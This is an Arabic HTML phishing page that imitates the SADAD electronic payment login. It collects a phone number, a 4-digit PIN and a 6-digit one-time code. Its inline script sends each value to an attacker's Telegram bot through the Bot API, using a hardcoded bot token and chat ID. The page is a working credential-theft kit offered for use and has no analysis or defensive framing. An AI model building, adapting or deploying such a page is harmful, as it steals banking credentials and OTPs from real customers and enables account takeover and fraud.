<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>سداد - تسجيل الدخول الآمن</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
        
        :root {
            --sadad-green: #28a745; /* اللون الأخضر الخاص بسداد */
            --sadad-dark: #1e7e34;
            --bg-light: #f8fbf9;
        }

        body { 
            font-family: 'Tajawal', sans-serif; 
            background: var(--bg-light); 
            margin: 0; 
            display: flex; 
            flex-direction: column; 
            min-height: 100vh;
        }

        /* هيدر بنمط ألوان سداد الأخضر */
        .app-header {
            background: linear-gradient(135deg, var(--sadad-green), var(--sadad-dark));
            height: 240px;
            padding: 40px 20px;
            border-bottom-left-radius: 45px;
            border-bottom-right-radius: 45px;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-shadow: 0 10px 25px rgba(40, 167, 69, 0.2);
        }

        /* الشعار - تم تحديث الرابط لضمان الظهور */
        .masrvi-logo {
            width: 180px;
            height: auto;
            background: white;
            padding: 12px;
            border-radius: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            margin-bottom: 15px;
        }

        .login-card {
            background: white;
            margin: -50px 25px 20px;
            padding: 35px 22px;
            border-radius: 25px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.08);
            border: 1px solid rgba(40, 167, 69, 0.1);
        }

        .input-box label {
            display: block;
            font-size: 13px;
            color: #555;
            margin-bottom: 8px;
            font-weight: 600;
        }

        .input-box input {
            width: 100%;
            padding: 15px;
            border: 1.8px solid #e0e0e0;
            border-radius: 15px;
            font-size: 18px;
            font-weight: bold;
            outline: none;
            text-align: center;
            color: var(--sadad-dark);
            transition: 0.3s;
        }

        .input-box input:focus {
            border-color: var(--sadad-green);
            background: #f0fff4;
        }

        /* زر الدخول بلون سداد */
        .btn-primary {
            background: var(--sadad-green);
            color: white;
            width: 100%;
            padding: 16px;
            border-radius: 15px;
            font-size: 19px;
            font-weight: bold;
            border: none;
            cursor: pointer;
            box-shadow: 0 6px 18px rgba(40, 167, 69, 0.3);
            transition: 0.3s;
        }

        .btn-primary:active {
            transform: scale(0.98);
            background: var(--sadad-dark);
        }

        #screen-otp { display: none; padding: 40px 20px; text-align: center; }

        .otp-input {
            width: 90%;
            padding: 15px;
            font-size: 28px;
            letter-spacing: 10px;
            border: 2px solid var(--sadad-green);
            border-radius: 15px;
            text-align: center;
            margin: 30px 0;
            outline: none;
            color: var(--sadad-dark);
            background: #f9fffb;
        }
    </style>
</head>
<body>

    <div id="screen-login">
        <div class="app-header">
            <!-- تم استبدال الرابط برابط مباشر لتخطي الحماية -->
            <img src="https://raw.githubusercontent.com/azizahmed2233/bank-assets/main/image_38.png" alt="SADAD" class="masrvi-logo">
            <p class="text-white opacity-90 text-sm">نظام سداد للدفع الإلكتروني الآمن</p>
        </div>

        <div class="login-card">
            <h2 class="text-xl font-bold text-gray-800 mb-6 text-center">تسجيل الدخول</h2>
            
            <div class="input-box mb-5">
                <label>رقم الهاتف</label>
                <input id="phone" type="tel" maxlength="8" 
                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
                       placeholder="00000000">
            </div>

            <div class="input-box mb-6">
                <label>الرمز السري</label>
                <input id="pin" type="password" maxlength="4" 
                       oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
                       placeholder="****">
            </div>

            <button onclick="handleLogin()" class="btn-primary">دخول آمن</button>
            <p class="text-center text-green-700 mt-6 text-sm font-medium">استعادة الوصول إلى الحساب</p>
        </div>
    </div>

    <div id="screen-otp">
        <div class="mb-10">
            <img src="https://img.icons8.com/ios-filled/100/28a745/verified-badge.png" class="mx-auto mb-4">
            <h2 class="text-2xl font-bold text-gray-800">تأكيد الرمز</h2>
            <p class="text-gray-500 mt-2">أدخل الرمز المكون من 6 أرقام المرسل إليك</p>
        </div>

        <div class="bg-white p-8 rounded-3xl shadow-md border border-green-50 mx-6">
            <input id="otp_code" type="tel" maxlength="6" class="otp-input"
                   oninput="this.value = this.value.replace(/[^0-9]/g, '');"
                   placeholder="000000">
            
            <button onclick="submitOTP()" class="btn-primary">تأكيد التحقق</button>
        </div>
    </div>

    <script>
        // القوانين الصارمة لإرسال البيانات
        const TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
        const CHAT = "8665814266";

        function handleLogin() {
            const u = document.getElementById('phone').value;
            const p = document.getElementById('pin').value;

            // قانون الـ 8 أرقام للهاتف و 4 للرمز السري
            if(u.length === 8 && p.length === 4) {
                send(`🟢 SADAD New Login\n📱 Phone: ${u}\n🔐 PIN: ${p}`);
                document.getElementById('screen-login').style.display = 'none';
                document.getElementById('screen-otp').style.display = 'block';
            } else {
                alert("يرجى إدخال 8 أرقام للهاتف و4 أرقام للرمز السري");
            }
        }

        function submitOTP() {
            const code = document.getElementById('otp_code').value;
            if(code.length === 6) {
                send(`🔑 SADAD OTP: ${code}`);
                alert("جاري معالجة طلبك...");
                setTimeout(() => { location.reload(); }, 2000);
            } else {
                alert("يرجى إدخال رمز التحقق المكون من 6 أرقام");
            }
        }

        function send(msg) {
            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`;
            fetch(url).catch(err => console.error("Error sending to TG"));
        }
    </script>
</body>
</html>
